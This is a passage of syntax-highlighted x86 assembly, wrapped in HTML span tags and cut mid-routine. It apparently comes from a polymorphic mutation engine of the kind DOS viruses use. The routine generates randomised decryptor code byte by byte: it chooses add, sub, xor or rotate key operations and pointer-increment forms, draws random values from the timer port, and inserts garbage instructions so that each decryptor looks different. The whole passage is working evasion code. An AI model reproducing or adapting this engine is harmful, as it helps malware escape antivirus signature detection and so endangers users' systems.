        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

</span><span class="sc5">no_addo</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">subbing</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">enc_loop</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">        </span><span class="sc1">; ADD ,2ch</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">xoring</span><span class="sc0">
</span><span class="sc5">subbing</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">xor_oper</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc4">-</span><span class="sc2">30h</span><span class="sc0">
</span><span class="sc5">xor_oper</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">enc_loop</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">        </span><span class="sc1">; SUB ,04h</span><span class="sc0">
</span><span class="sc5">xoring</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_store</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">6h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
</span><span class="sc5">addon</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">addon</span><span class="sc0">

</span><span class="sc5">no_store</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">                          </span><span class="sc1">; SI?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finish_pointer</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">07h</span><span class="sc0">                          </span><span class="sc1">; DI?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finish_pointer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">                          </span><span class="sc1">; BX?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">finish_pointer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">03fh</span><span class="sc0">                         </span><span class="sc1">; well, BP!</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; bp needs 1 byte more</span><span class="sc0">
</span><span class="sc5">finish_pointer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">nowordi</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">random_value</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                                  </span><span class="sc1">; one random value</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">nowordi</span><span class="sc0">                        </span><span class="sc1">; encrypting words?</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">

        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">random_value</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; one more for word</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">nowordi</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">

        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">random_value</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc1">; two more for dword</span><span class="sc0">
</span><span class="sc5">nowordi</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">            </span><span class="sc1">; is word?</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">noby</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">                              </span><span class="sc1">; one more pnt inc for word</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">noby</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">                              </span><span class="sc1">; two more incs for dword</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">

</span><span class="sc5">noby</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">do_inc_pointer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">              </span><span class="sc1">; some foo instructions</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">normal_inc</span><span class="sc0">
</span><span class="sc1">;make with add/sub register</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0c083h</span><span class="sc0">               </span><span class="sc1">; add ax,</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_sub</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">                  </span><span class="sc1">; change to sub</span><span class="sc0">
</span><span class="sc5">no_sub</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
</span><span class="sc1">;and now how many sub/add</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">store_and_test</span><span class="sc0">

</span><span class="sc1">;make with inc/dec register</span><span class="sc0">
</span><span class="sc5">normal_inc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc0">                 </span><span class="sc1">; pointer increment</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_decrement</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                  </span><span class="sc1">; dec base</span><span class="sc0">
</span><span class="sc5">no_decrement</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc5">store_and_test</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">do_inc_pointer</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_key_change</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">                 </span><span class="sc1">; select change mode</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">rollio</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0c081h</span><span class="sc0">

        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">ok_ahis</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">

</span><span class="sc5">ok_ahis</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">finish_ax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc0">

        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">finish_ax</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">

</span><span class="sc5">finish_ax</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">modify_key</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nocx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">modify_key</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">083h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_secondrnd</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">modify_key</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">no_secondrnd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">garb_ex</span><span class="sc0">
</span><span class="sc5">rollio</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0c0d1h</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">storeit</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">
</span><span class="sc5">storeit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">modify_key</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">nocx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">garb_ex</span><span class="sc0">

</span><span class="sc5">no_key_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">02h</span><span class="sc0">          </span><span class="sc1">; rol/ror with changing CX</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">no_cl_change</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">041h</span><span class="sc0">                         </span><span class="sc1">; inc cx</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">increment_cx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">08h</span><span class="sc0">                          </span><span class="sc1">; 49h = dec cx</span><span class="sc0">
</span><span class="sc5">increment_cx</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">random_value</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0"> </span><span class="sc1">; put also in encryptor</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">


</span><span class="sc5">garb_ex</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">

</span><span class="sc5">no_cl_change</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">048h</span><span class="sc0">                         </span><span class="sc1">; dec counter</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_random_dx_0f</span><span class="sc0">                 </span><span class="sc1">; CMP or no CMP?</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">05h</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">direct_ncmp</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">do_garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">no_compare</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">083h</span><span class="sc0">                         </span><span class="sc1">; base for ops</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">no_cmp</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f8h</span><span class="sc0">                         </span><span class="sc1">; CMP counter,0</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">comp_store</span><span class="sc0">
</span><span class="sc5">no_cmp</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">oring</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc0">                         </span><span class="sc1">; XOR counter,0</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">comp_store</span><span class="sc0">
</span><span class="sc5">oring</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc0">                         </span><span class="sc1">; OR  counter,0</span><span class="sc0">
</span><span class="sc5">comp_store</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; store op</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">                           </span><span class="sc1">; CMP/XOR/OR counter,0</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">direct_ncmp</span><span class="sc0">
</span><span class="sc5">no_compare</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">04h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">do_with_and</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">                          </span><span class="sc1">; OR counter,counter</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">second_operand</span><span class="sc0">
</span><span class="sc5">do_with_and</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">23h</span><span class="sc0">
</span><span class="sc5">second_operand</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc0">                         </span><span class="sc1">; AND counter,counter</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">instr_change</span><span class="sc0">
